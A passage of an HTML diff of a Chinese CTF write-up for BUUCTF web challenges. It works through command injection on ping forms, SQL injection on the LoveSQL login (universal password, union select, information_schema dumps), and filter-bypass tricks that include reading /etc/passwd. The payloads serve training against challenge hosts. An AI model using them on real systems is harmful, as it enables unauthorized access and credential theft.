 <h3 id="font-colora020f0题目分析font-7"><a href="#font-colora020f0题目分析font-7" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0题目分析font-7" class="headings"><font color=#A020F0>题目分析</font></a></h3>
 <p>输入本地ip 127.0.0.1 查看回显</p>
-<pre><code>PING 127.0.0.1 (127.0.0.1): 56 data bytes
+<pre tabindex="0"><code>PING 127.0.0.1 (127.0.0.1): 56 data bytes
 </code></pre><p>输入 127.0.0.1 | ls  查看</p>
-<pre><code>index.php
+<pre tabindex="0"><code>index.php
 </code></pre><p>测试 127.0.0.1 | ls / 查看上级目录</p>
-<pre><code>bin
+<pre tabindex="0"><code>bin
 dev
 etc
 flag
@@ -1501,24 +1501,24 @@ run
 sbin
 srv
 </code></pre><p>直接 127.0.0.1 | cat /flag</p>
-<pre><code>flag{51b10547-21c0-44fa-af89-e4c0f6fd3b96}
+<pre tabindex="0"><code>flag{51b10547-21c0-44fa-af89-e4c0f6fd3b96}
 </code></pre><h2 id="font-color0288d1-极客大挑战-2019lovesqlfont"><a href="#font-color0288d1-极客大挑战-2019lovesqlfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-极客大挑战-2019lovesqlfont" class="headings"><font color=#0288D1> 【极客大挑战 2019】LoveSQL</font></a></h2>
 <h3 id="font-colora020f0知识点sql注入构造闭合万能密码font-1"><a href="#font-colora020f0知识点sql注入构造闭合万能密码font-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0知识点sql注入构造闭合万能密码font-1" class="headings"><font color=#A020F0>知识点：SQL注入，构造闭合，万能密码</font></a></h3>
 <h3 id="font-colora020f0题目分析font-8"><a href="#font-colora020f0题目分析font-8" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0题目分析font-8" class="headings"><font color=#A020F0>题目分析</font></a></h3>
 <p>尝试使用万能密码：</p>
-<pre><code>http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1' or '1'='1 &amp;password=1' or '1'='1
+<pre tabindex="0"><code>http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1' or '1'='1 &amp;password=1' or '1'='1
 </code></pre><p>回显登录成功，但并没有拿到flag，继续注入</p>
 <p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132723578.png" alt="image-20210616132723578"></p>
 <p>判断字段数：</p>
-<pre><code>http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1' order by 4 %23&amp;password=1' or '1'='1
+<pre tabindex="0"><code>http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1' order by 4 %23&amp;password=1' or '1'='1
 </code></pre><p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132859954.png" alt="image-20210616132859954"></p>
 <p>union注入查询：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3 %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3 %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>回显成功：</p>
@@ -1526,17 +1526,17 @@ srv
 <p>查询数据库名：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,database() %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,database() %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133059398.png" alt="image-20210616133059398"></p>
 <p>查询表名、字段名：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1545,7 +1545,7 @@ srv
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">a26fac72</span><span class="o">-</span><span class="n">af79</span><span class="o">-</span><span class="mi">450</span><span class="n">e</span><span class="o">-</span><span class="n">b512</span><span class="o">-</span><span class="n">f6c817dd9e4f</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())  %23&amp;password=1&#39;</span> <span class="ow">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">a26fac72</span><span class="o">-</span><span class="n">af79</span><span class="o">-</span><span class="mi">450</span><span class="n">e</span><span class="o">-</span><span class="n">b512</span><span class="o">-</span><span class="n">f6c817dd9e4f</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())  %23&amp;password=1&#39;</span> <span class="ow">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1</span>
 
 <span class="c1">#表名： Your password is &#39;geekuser,l0ve1ysq1&#39;</span>
 
@@ -1557,19 +1557,19 @@ srv
 </div><p>查询geekuser、l0ve1ysq1表 的字段内容：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1)  %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">a26fac72</span><span class="o">-</span><span class="nx">af79</span><span class="o">-</span><span class="mi">450</span><span class="nx">e</span><span class="o">-</span><span class="nx">b512</span><span class="o">-</span><span class="nx">f6c817dd9e4f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1)  %23&amp;password=1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>拿到flag:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">flag</span><span class="p">{</span><span class="mf">175027e1</span><span class="o">-</span><span class="mi">1326</span><span class="o">-</span><span class="mi">4</span><span class="nx">d42</span><span class="o">-</span><span class="mi">9515</span><span class="o">-</span><span class="mf">1e4</span><span class="nx">c0cd5d521</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">flag</span><span class="p">{</span><span class="mf">175027e1</span><span class="o">-</span><span class="mi">1326</span><span class="o">-</span><span class="mi">4</span><span class="nx">d42</span><span class="o">-</span><span class="mi">9515</span><span class="o">-</span><span class="mf">1e4</span><span class="nx">c0cd5d521</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="font-color0288d1-gxyctf2019ping-ping-pingfont"><a href="#font-color0288d1-gxyctf2019ping-ping-pingfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-gxyctf2019ping-ping-pingfont" class="headings"><font color=#0288D1> 【GXYCTF2019】Ping Ping Ping</font></a></h2>
@@ -1577,7 +1577,7 @@ srv
 <p>绕过空格的方法大概有以下几种：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1587,7 +1587,7 @@ srv
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$IFS</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$IFS</span>
 <span class="err">$</span><span class="p">{</span><span class="nx">IFS</span><span class="p">}</span>
 <span class="nv">$IFS</span><span class="err">$</span><span class="mi">1</span> <span class="c1">//$1改成$加其他数字貌似都行
 </span><span class="c1"></span><span class="o">&lt;</span> 
@@ -1599,53 +1599,53 @@ srv
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ps</span><span class="p">:</span><span class="err">有时会禁用</span><span class="n">cat</span><span class="p">:</span>
-<span class="err">解决方法是使用</span><span class="n">tac反向输出命令</span><span class="err">：</span>
-<span class="n">linux命令中可以加</span>\<span class="err">，所以甚至可以</span><span class="n">ca</span>\<span class="n">t</span> <span class="o">/</span><span class="n">fl</span>\<span class="n">ag</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ps</span><span class="p">:</span><span class="n">有时会禁用cat</span><span class="p">:</span>
+<span class="n">解决方法是使用tac反向输出命令</span><span class="err">：</span>
+<span class="n">linux命令中可以加</span>\<span class="err">，</span><span class="n">所以甚至可以ca</span>\<span class="n">t</span> <span class="o">/</span><span class="n">fl</span>\<span class="n">ag</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><strong>黑名单绕过</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">a</span><span class="o">=</span><span class="n">l</span><span class="p">;</span><span class="n">b</span><span class="o">=</span><span class="n">s</span><span class="p">;</span><span class="err">$</span><span class="n">a</span><span class="err">$</span><span class="n">b</span>                 <span class="o">//</span><span class="err">变量拼接</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">a</span><span class="o">=</span><span class="n">l</span><span class="p">;</span><span class="n">b</span><span class="o">=</span><span class="n">s</span><span class="p">;</span><span class="err">$</span><span class="n">a</span><span class="err">$</span><span class="n">b</span>                 <span class="o">//</span><span class="n">变量拼接</span>
 <span class="n">echo</span> <span class="s2">&#34;bHM=&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>      <span class="o">//</span><span class="n">base64编码</span>
 <span class="o">/</span><span class="err">?</span><span class="ow">in</span><span class="o">/</span><span class="err">?</span><span class="n">s</span> <span class="o">=&gt;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ls</span>
-<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">pass</span><span class="s1">&#39;w&#39;</span><span class="n">d</span>           <span class="o">//</span><span class="err">连接符</span>
-<span class="n">cat</span><span class="err">$</span><span class="n">x</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>           <span class="o">//</span><span class="err">未定义的初始化变量</span> 
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">pass</span><span class="s1">&#39;w&#39;</span><span class="n">d</span>           <span class="o">//</span><span class="n">连接符</span>
+<span class="n">cat</span><span class="err">$</span><span class="n">x</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>           <span class="o">//</span><span class="n">未定义的初始化变量</span> 
 </code></pre></td></tr></table></div>
 </div>
 </div><h3 id="font-colora020f0题目分析font-9"><a href="#font-colora020f0题目分析font-9" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0题目分析font-9" class="headings"><font color=#A020F0>题目分析</font></a></h3>
 <p>命令执行注入：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">ls</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">ls</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>发现 flag.php 文件夹</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span>
 <span class="nx">PING</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">)</span><span class="o">:</span> <span class="mi">56</span> <span class="nx">data</span> <span class="nx">bytes</span>
 <span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
 <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
@@ -1654,18 +1654,18 @@ srv
 </div><p>拿flag：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
